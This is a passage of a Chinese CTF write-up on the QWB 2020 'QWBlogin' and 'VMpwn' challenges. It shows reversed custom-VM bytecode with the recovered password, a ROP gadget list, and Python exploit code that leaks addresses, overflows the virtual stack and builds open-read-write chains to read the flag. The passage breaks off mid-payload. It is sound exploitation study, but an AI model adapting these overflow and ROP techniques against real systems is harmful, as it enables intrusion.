class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x23</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x28</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0xb</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">dword</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x51</span>\t\t\t\t|Q\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x57</span>\t\t\t\t| W\n<span class=\"hljs-keyword\">jne</span> <span class=\"hljs-number\">0x3</span>\n<span class=\"hljs-keyword\">jmp</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x77</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x26</span>\t\t\t\t| Q\n<span class=\"hljs-keyword\">jne</span> <span class=\"hljs-number\">0xffffffc9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x48</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x50</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x58</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x60</span>], <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">word</span> <span class=\"hljs-number\">0x40</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x21</span>\n<span class=\"hljs-keyword\">syscall</span> data\t\t\t\t\t| read(<span class=\"hljs-number\">0</span>, data[<span class=\"hljs-number\">0x40</span>], <span class=\"hljs-number\">0x21</span>)\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\t| G00DR3VR\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x427234129827abcd</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x10240740dc179b8a</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x48</span>]\t| W31LD0N3\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x127412341241dead</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x213a22705e70edfa</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x50</span>]\t| Try2Pwn!\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x8634965812abc123</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0xa75ae10820d2b377</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x58</span>]\t| GOGOGOGO\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x123216781236789a</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x5d75593f5d7137dd</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x34</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x6</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> r17\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> r17, r16\n<span class=\"hljs-keyword\">sub</span> r16, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x100</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r4</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r5</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0xa214f474f4721</span>\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r5</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r5</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x574f4e54494e5750</span>\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r5</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r5</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0xf</span>\n<span class=\"hljs-keyword\">syscall</span> stack\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">r4</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x800</span>\n<span class=\"hljs-keyword\">syscall</span> stack\t\t\t\t\t| read(<span class=\"hljs-number\">0</span>, stack[], <span class=\"hljs-number\">0x800</span>)\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0</span>         \n<span class=\"hljs-keyword\">jnl</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">r0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">r4</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> r16, r17      \n<span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">qword</span> r17\n<span class=\"hljs-keyword\">ret</span></code></pre>\n\n<p>于是程序就比较清晰了，如果输入了<code>password</code>为<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>就能走到最后溢出的地方</p>\n<p>最后在<code>read(0, stack, 0x800)</code>的地方会出现溢出，然后在<code>ret</code>的时候把栈上的内容<code>pop</code>到<code>vm.pc</code>，于是就需要在<code>test.bin</code>里面找到可以用<code>gadgets</code></p>\n<h3 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h3><h4 id=\"gadgets\"><a href=\"#gadgets\" class=\"headerlink\" title=\"gadgets\"></a>gadgets</h4><p>在程序<code>RET</code>之后还有一大段无关的<code>opcode</code>，做到这步的时候才知道，这些就是为了凑<code>gadgets</code>的</p>\n<p>其中标记为<code>R</code>的是不需要限制的</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># 0x0d 0xR6 0x00 0x11 0xRR</span>\npop_r00_ret = <span class=\"hljs-number\">0x2f5</span>         <span class=\"hljs-comment\"># 0x46</span>\n<span class=\"hljs-comment\"># 0x0d 0xR6 0x01 0X11 0xRR</span>\npop_r01_ret = <span class=\"hljs-number\">0x377</span>         <span class=\"hljs-comment\"># 0x46</span>\n<span class=\"hljs-comment\"># 0x0d 0xR6 0x02 0x11 0xRR</span>\npop_r02_ret = <span class=\"hljs-number\">0x45c</span>         <span class=\"hljs-comment\"># 0x46</span>\n<span class=\"hljs-comment\"># 0x0d 0xR6 0x03 0x11 0xRR</span>\npop_r03_ret = <span class=\"hljs-number\">0x4e1</span>         <span class=\"hljs-comment\"># 0x46</span>\n\n<span class=\"hljs-comment\"># 0x20 0x0a 0x11 0xRR</span>\nsys_open_ret = <span class=\"hljs-number\">0x6ed</span>\n<span class=\"hljs-comment\"># 0x20 0xR8 0x11 0xRR</span>\nsys_data_ret = <span class=\"hljs-number\">0x5b1</span>\n<span class=\"hljs-comment\"># 0x20 0xR9 0x11 0xRR</span>\nsys_stack_ret = <span class=\"hljs-number\">0x617</span></code></pre>\n\n\n\n<h4 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h4><p>由于<code>syscall</code>中只有<code>open | read | write | close</code>可用，很自然想到<code>orw</code>，然后构造<code>rop</code>链就行了，其中由于最开始打开了<code>test.bin</code>文件，所以<code>fd=4</code>，最初写<code>exp</code>的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了<code>struct.c =&gt; struct.o</code>再在调试的时候<code>add-symbol-file struct.o 0</code>即可</p>\n<pre><code class=\"hljs python\">payload = <span class=\"hljs-string\">b&quot;A&quot;</span>*<span class=\"hljs-number\">0x108</span>\n<span class=\"hljs-comment\"># read(0, data[0x100], 0x20)</span>\n<span class=\"hljs-comment\"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">1</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r03_ret) + p64(<span class=\"hljs-number\">0x20</span>)\npayload += p64(sys_data_ret)\n\n<span class=\"hljs-comment\"># open(data[0x100], 0)</span>\n<span class=\"hljs-comment\"># r00 = 0 r01 = 0x200 r02 = 0</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">0</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0</span>)\npayload += p64(sys_open_ret)\n\n<span class=\"hljs-comment\"># read(4, data[0x100], 0x30)</span>\n<span class=\"hljs-comment\"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">1</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0x4</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r03_ret) + p64(<span class=\"hljs-number\">0x30</span>)\npayload += p64(sys_data_ret)\n\n<span class=\"hljs-comment\"># write(1, data[0x100], 0x30)</span>\n<span class=\"hljs-comment\"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">2</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0x1</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r03_ret) + p64(<span class=\"hljs-number\">0x30</span>)\npayload += p64(sys_data_ret)</code></pre>\n\n\n\n<p>强的大佬，不需要<code>instruction.h</code>都能在5个小时内做出来，而我就是只菜鸡</p>\n<p><a href=\"https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin\">QWBlogin 题目</a></p>\n<h2 id=\"VMpwn\"><a href=\"#VMpwn\" class=\"headerlink\" title=\"VMpwn\"></a>VMpwn</h2><p>这个题目跟上一个题目一样先逆向，但是这个题目跟<code>QWBlogin</code>相比实现<code>vm</code>的时候简单一些</p>\n<p>其中有一个 <code>chunk 0x30</code>用来记录寄存器的值<code>vm[0] vm[1] vm[2]</code> 类似<code>rdi, rsi, rdx</code>在<code>syscall</code>时会用到，<code>vm[3]</code>为<code>sp</code>，<code>vm[5]</code>为 <code>pc</code></p>\n<p>在最后的关键操作为对于<code>read(0, stack, 0x1000)</code>（栈只有<code>0x100</code>个字节）</p>\n<pre><code class=\"hljs assembly\">pwndbg&gt; distance 0x555555759050 0x55555575ad68\n0x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words)\n\n RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0\n ► 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;\n        fd: 0x0\n        buf: 0x55555575ad68 ◂— 0x0\n        nbytes: 0x1000\n\npwndbg&gt; telescope 0x555555758010\n00:0000│   0x555555758010 ◂— 0x0\n01:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x0\n02:0010│   0x555555758020 ◂— 0x1000\n03:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x0\n04:0020│   0x555555758030 ◂— 0x0\n05:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10</code></pre>\n\n<p>然后<code>puts(stack)</code>，可以看到该虚拟栈上有<code>heap</code>地址和<code>elf</code>地址，但是只能泄漏一个</p>\n<pre><code class=\"hljs assembly\">pwndbg&gt; telescope 0x55555575ad68 0x30\n00:0000│ rsi  0x55555575ad68 ◂— &#39;1234454636\\n&#39;\n01:0008│      0x55555575ad70 ◂— 0xa3633 &#x2F;* &#39;36\\n&#39; *&#x2F;\n02:0010│      0x55555575ad78 ◂— 0x0\n... ↓\n1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f (&#39;ok,what &#39;)\n1f:00f8│      0x55555575ae60 ◂— 0x0\n20:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff</code></pre>\n\n<p>接下来同第一步的<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>然后<code>ret</code></p>\n<p>这个程序中有一个两个比较奇怪的地方，由于<code>ret</code>的时候程序的实现，是将<code>sp-=8</code>，但是<code>PUSH</code>为<code>sp-=8</code> <code>POP</code>为<code>sp+=8</code>，因此<code>ret</code>的时候比较奇怪，另外就是与<code>QWBlogin</code>相比没有 什么能用的<code>gadget</code>，因此想法只能为按照<code>vm</code>的规则，写<code>shellocde</code>，然后在最后<code>ret</code>的时候跳转过去，但是该题用 <code>seccomp</code>限制了只能 <code>orw</code>，且没有给<code>open</code>的 <code>syscall</code>只能泄漏</p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>因此思路就是，先利用<code>puts</code>泄漏<code>elf</code>的地址，然后再<code>ret</code>到最初<code>elf_code+0x3</code>然后再泄漏<code>heap</code>，<code>ret</code>到写入栈上的<code>shellcode</code></p>\n<p>利用<code>puts</code>泄漏<code>libc</code>，然后再次输入到栈上，利用<code>\\x6d: mov reg[0], 0</code>作为<code>nop</code>，编写<code>shellcode</code></p>\n<p>然后将<code>open</code>写入<code>free</code>的位置，因此在调用<code>syscall 03</code>时就是调用<code>open</code>，最后利用<code>orw</code>进行读取<code>flag</code></p>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># heap+0x2e68 =&gt; elf_bss</span>\n\nio.sendafter(<span class=\"hljs-string\">&quot;name:&quot;</span>, <span class=\"hljs-string\">&quot;A&quot;</span>*<span class=\"hljs-number\">0xff</span>+<span class=\"hljs-string\">&quot;#&quot;</span>)\n\nio.recvuntil(<span class=\"hljs-string\">&quot;#&quot;</span>)\nelf.address = u64(io.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">&quot;\\x00\\x00&quot;</span>) - <span class=\"hljs-number\">0x203851</span>\nsuccess(<span class=\"hljs-string\">&quot;elf&quot;</span>, elf.address)\n\n\n<span class=\"hljs-comment\"># 0xf8 + ret </span>\nio.sendafter(<span class=\"hljs-string\">&quot;say:&quot;</span>, <span class=\"hljs-string\">&quot;A&quot;</span>*<span class=\"hljs-number\">0x100</span> + p64(elf.address + <span class=\"hljs-number\">0x203023</span>))\n\nio.sendafter(<span class=\"hljs-string\">&quot;name:&quot;</span>, <span class=\"hljs-string\">&quot;\\x50&quot;</span>)\nheap = u64(io.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">&quot;\\x00\\x00&quot;</span>) - <span class=\"hljs-number\">0x50</span>\nsuccess(<span class=\"hljs-string\">&quot;heap&quot;</span>, heap)\n\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n<span class=\"hljs-string\">mov reg[0], read_got</span>\n<span class=\"hljs-string\">puts</span>\n<span class=\"hljs-string\">mov reg[0], 0</span>\n<span class=\"hljs-string\">mov reg[1], heap + addr</span>\n<span class=\"hljs-string\">mov reg[2], 0x1000</span>\n<span class=\"hljs-string\">read        </span>\n<span class=\"hljs-string\">//  use 0x6d: mov reg[0], 0 as nop</span>\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n\npayload = <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(elf.got[<span class=\"hljs-string\">&#x27;read&#x27;</span>])\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x02&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x6d&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(heap+<span class=\"hljs-number\">0x2d60</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">0x1000</span>)\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x00&quot;</span>\npayload = payload.ljust(<span class=\"hljs-number\">0x100</span>, <span class=\"hljs-string\">&quot;A&quot;</span>)\npayload += p64(heap+<span class=\"hljs-number\">0x2d60</span>)\nio.sendafter(<span class=\"hljs-string\">&quot;say:&quot;</span>, payload)\n\nio.recvuntil(<span class=\"hljs-string\">&quot;bye~\\n&quot;</span>)\n\nlibc.address = u64(io.recvuntil(<span class=\"hljs-string\">&quot;\\n&quot;</span>, drop=<span class=\"hljs-literal\">True</span>).ljust(<span class=\"hljs-number\">8</span>, <span class=\"hljs-string\">&quot;\\x00&quot;</span>)) - libc.sym[<span class=\"hljs-string\">&#x27;read&#x27;</span>]\n\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n<span class=\"hljs-string\">flag</span>\n<span class=\"hljs-string\">0x6d * 0x50</span>\n<span class=\"hljs-string\">mov reg[1], elf.address+0x203900</span>\n<span class=\"hljs-string\">mov reg[2], 8</span>\n<span class=\"hljs-string\">read</span>\n<span class=\"hljs-string\">mov reg[0], heap+0x2d60</span>\n<span class=\"hljs-string\">mov reg[1], 0</span>\n<span class=\"hljs-string\">open</span>\n<span class=\"hljs-string\">mov reg[0], 3</span>\n<span class=\"hljs-string\">mov reg[1], bss</span>\n<span class=\"hljs-string\">mov reg[2], 0x30</span>\n<span class=\"hljs-string\">read</span>\n<span class=\"hljs-string\">mov reg[0], 1</span>\n<span class=\"hljs-string\">mov reg[1], bss</span>\n<span class=\"hljs-string\">mov reg[2], 0x30</span>\n<span class=\"hljs-string\">write</span>\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n\npayload = <span class=\"hljs-string\">&quot;flag\\x00&quot;</span>\npayload = payload.ljust(<span class=\"hljs-number\">0x50</span>, <span class=\"hljs-string\">&quot;\\x6d&quot;</span>)\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(elf.address+<span class=\"hljs-number\">0x2038f8</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">8</span>)\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x00&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(heap+<span class=\"hljs-number\">0x2d60</span>)\npayload += <span class=\"hljs-string\">&quot;\\x6e&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x03&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(<span class=\"hljs-number\">3</span>)\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(elf.bss()+<span class=\"hljs-number\">0x400</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">0x30</span>)\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x00&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(<span class=\"hljs-number\">1</span>)\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(elf.bss()+<span class=\"hljs-number\">0x400</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">0x30</span>)\npayload += <span 